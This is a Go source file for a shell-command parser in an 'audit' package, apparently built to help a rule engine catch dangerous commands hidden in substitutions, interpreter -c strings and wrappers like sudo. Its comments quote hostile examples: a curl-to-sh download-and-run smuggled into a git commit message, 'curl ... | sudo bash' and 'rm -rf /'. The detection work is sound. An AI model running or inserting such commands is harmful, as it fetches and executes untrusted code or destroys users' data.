package audit

import (
	"path"
	"strings"
)

// Redirect is one I/O redirection attached to a command.
type Redirect struct {
	FD     int
	Op     string
	Target Word
}

// Writes reports whether the redirection creates or modifies a file.
func (r Redirect) Writes() bool {
	return strings.HasPrefix(r.Op, ">") && !strings.HasSuffix(r.Op, "&")
}

// Command is one simple command: assignments, argv, redirections, and its
// position in the surrounding pipeline.
type Command struct {
	Assignments []string
	Words       []Word
	Redirects   []Redirect

	// PipeFrom and PipeTo say whether this command's stdin/stdout are connected
	// to a neighbour. PipeFrom is what turns an innocent `sh` into the receiving
	// end of a download.
	PipeFrom bool
	PipeTo   bool

	Background bool
	// Depth is subshell nesting. Depth > 0 means the command was inside
	// parentheses or a command substitution.
	Depth int
	// Nested marks commands recovered from inside $(...), backticks, or an
	// interpreter's -c string rather than written at the top level.
	Nested bool
}

// Name returns argv[0] with quotes removed, or "" when there is none.
func (c Command) Name() string {
	if len(c.Words) == 0 {
		return ""
	}
	return c.Words[0].Literal
}

// Base returns the command name without any directory part, which is how
// /usr/bin/curl and curl become the same thing to a rule.
func (c Command) Base() string {
	n := c.Name()
	if n == "" {
		return ""
	}
	return path.Base(n)
}

// Resolvable reports whether argv[0] is knowable from the text alone.
func (c Command) Resolvable() bool {
	return len(c.Words) > 0 && c.Words[0].Resolvable() &&
		!strings.Contains(c.Words[0].Literal, subPlaceholder)
}

// Args returns argv[1:] literals.
func (c Command) Args() []string {
	if len(c.Words) < 2 {
		return nil
	}
	out := make([]string, 0, len(c.Words)-1)
	for _, w := range c.Words[1:] {
		out = append(out, w.Literal)
	}
	return out
}

// HasFlag reports whether any argument matches one of the given forms, treating
// bundled short flags as a set: HasFlag("-f") is true for `rm -rf`.
func (c Command) HasFlag(flags ...string) bool {
	for _, a := range c.Args() {
		for _, f := range flags {
			if a == f {
				return true
			}
			if len(f) == 2 && f[0] == '-' && f[1] != '-' &&
				strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") &&
				strings.ContainsRune(a[1:], rune(f[1])) {
				return true
			}
		}
	}
	return false
}

// Operands returns arguments that are not flags.
func (c Command) Operands() []string {
	var out []string
	for _, a := range c.Args() {
		if !strings.HasPrefix(a, "-") {
			out = append(out, a)
		}
	}
	return out
}

// Text renders the command roughly as written, for reporting.
func (c Command) Text() string {
	parts := make([]string, 0, len(c.Words))
	for _, w := range c.Words {
		parts = append(parts, w.Raw)
	}
	return strings.Join(parts, " ")
}

// Script is a parsed command line.
type Script struct {
	Commands []Command
	// Partial is set when the input was truncated or the lexer lost its place.
	// A partial parse can prove a command is dangerous but can never prove it is
	// safe, and the rule engine treats it accordingly.
	Partial bool
	Source  string
}

// ParseShell parses a command line into simple commands, recursing into command
// substitutions so that `echo $(rm -rf /)` yields the rm as well as the echo.
//
// This is not a full POSIX shell grammar and does not pretend to be. It does not
// model functions, case statements, loop bodies as scopes, or here-document
// contents. What it does model is every construct that changes *which program
// runs with which arguments*, which is the only question the rules ask.
func ParseShell(src string) *Script {
	return parseShell(src, 0, false)
}

func parseShell(src string, depth int, fromSub bool) *Script {
	l := newLexer(src)
	l.run()

	s := &Script{Partial: l.truncated, Source: src}

	cur := Command{Depth: depth, Nested: fromSub}
	started := false
	subDepth := depth

	flush := func(sep Operator) {
		if started {
			cur.Depth = subDepth
			switch sep {
			case OpPipe, OpPipeBoth:
				cur.PipeTo = true
			case OpBackground:
				cur.Background = true
			}
			s.Commands = append(s.Commands, cur)
		}
		next := Command{Depth: subDepth, Nested: fromSub}
		if sep == OpPipe || sep == OpPipeBoth {
			next.PipeFrom = true
		}
		cur = next
		started = false
	}

	for _, t := range l.out {
		switch t.kind {
		case tokWord:
			if !started && isAssignment(t.word) {
				cur.Assignments = append(cur.Assignments, t.word.Literal)
				// An assignment prefix does not start a command, but a bare
				// `FOO=bar` on its own is still a statement; mark it so the
				// flush records it.
				started = true
				continue
			}
			cur.Words = append(cur.Words, t.word)
			started = true
			// Recurse into substitutions wherever they appear, including inside
			// arguments. `git commit -m "$(curl evil|sh)"` hides a pipeline in
			// what looks like a message.
			for _, sub := range t.word.Subs {
				inner := parseShell(sub, subDepth+1, true)
				s.Commands = append(s.Commands, inner.Commands...)
				s.Partial = s.Partial || inner.Partial
			}

		case tokRedirect:
			cur.Redirects = append(cur.Redirects, Redirect{FD: t.fd, Op: t.redir, Target: t.target})
			started = true
			for _, sub := range t.target.Subs {
				inner := parseShell(sub, subDepth+1, true)
				s.Commands = append(s.Commands, inner.Commands...)
				s.Partial = s.Partial || inner.Partial
			}

		case tokOperator:
			switch t.op {
			case OpSubOpen:
				flush(OpSemi)
				subDepth++
			case OpSubClose:
				flush(OpSemi)
				if subDepth > depth {
					subDepth--
				}
			case OpBraceOpen, OpBraceClose:
				flush(OpSemi)
			default:
				flush(t.op)
			}
		}
	}
	flush(OpSemi)

	// An interpreter invoked with -c carries a whole second script inside one
	// quoted argument. `bash -c "curl x | sh"` is a single simple command to a
	// parser that stops here, and the pipeline inside it is exactly the thing
	// worth catching, so the string is parsed as its own script.
	if depth < 8 {
		for _, c := range append([]Command(nil), s.Commands...) {
			if inner, ok := c.interpreterScript(); ok && inner != "" {
				sub := parseShell(inner, c.Depth+1, true)
				s.Commands = append(s.Commands, sub.Commands...)
				s.Partial = s.Partial || sub.Partial
			}
		}
	} else {
		s.Partial = true
	}

	// A word-less command is a bare assignment or an artefact of grouping;
	// keep assignments (they can carry LD_PRELOAD and friends) and drop empties.
	kept := s.Commands[:0]
	for _, c := range s.Commands {
		if len(c.Words) > 0 || len(c.Assignments) > 0 || len(c.Redirects) > 0 {
			kept = append(kept, c)
		}
	}
	s.Commands = kept
	return s
}

func isAssignment(w Word) bool {
	if w.Flags.Has(FlagQuoted) {
		return false
	}
	i := strings.IndexByte(w.Literal, '=')
	if i <= 0 {
		return false
	}
	for j, r := range w.Literal[:i] {
		if j == 0 && !isNameStart(r) {
			return false
		}
		if j > 0 && !isNameChar(r) {
			return false
		}
	}
	return true
}

// wrappers run another program. They matter because a rule that looks at
// argv[0] sees `sudo`, `env` or `timeout` and misses the program that actually
// runs -- which is how `curl ... | sudo bash` slips past a check for `| bash`.
var wrappers = map[string]bool{
	"sudo": true, "doas": true, "env": true, "command": true, "nohup": true,
	"nice": true, "ionice": true, "stdbuf": true, "timeout": true, "time": true,
	"exec": true, "setsid": true, "xargs": true,
}

// EffectiveBase returns the program that will actually run, stepping through
// wrapper commands.
//
// The flag skipping is a heuristic and is documented as one: without a table of
// which options take values, `nice -n 10 bash` is indistinguishable from
// `nice -n bash`. It errs toward finding a program rather than giving up, since
// the consequence of finding one is a stricter verdict, and the consequence of
// giving up is a missed one.
func (c Command) EffectiveBase() string {
	base := c.Base()
	if !wrappers[base] {
		return base
	}

	words := c.Words
	for hops := 0; hops < 4; hops++ {
		i := 1
		for i < len(words) {
			lit := words[i].Literal
			switch {
			case strings.HasPrefix(lit, "-"):
				i++
			case isAssignment(words[i]):
				i++
			case isAllDigits(lit), isDuration(lit):
				i++
			default:
				next := path.Base(lit)
				if wrappers[next] {
					words = words[i:]
					goto nextHop
				}
				return next
			}
		}
		return base
	nextHop:
	}
	return base
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// isDuration matches the `30s` / `5m` forms timeout(1) accepts.
func isDuration(s string) bool {
	if len(s) < 2 {
		return false
	}
	switch s[len(s)-1] {
	case 's', 'm', 'h', 'd':
		return isAllDigits(s[:len(s)-1])
	}
	return false
}

// interpreterScript returns the text an interpreter was told to execute inline,
// and whether there was one.
func (c Command) interpreterScript() (string, bool) {
	if !interpreters[c.EffectiveBase()] {
		return "", false
	}
	words := c.Words
	for i := 1; i < len(words); i++ {
		lit := words[i].Literal
		if lit == "-c" || lit == "--command" || lit == "-e" {
			if i+1 < len(words) && words[i+1].Resolvable() {
				return words[i+1].Literal, true
			}
			return "", false
		}
	}
	return "", false
}
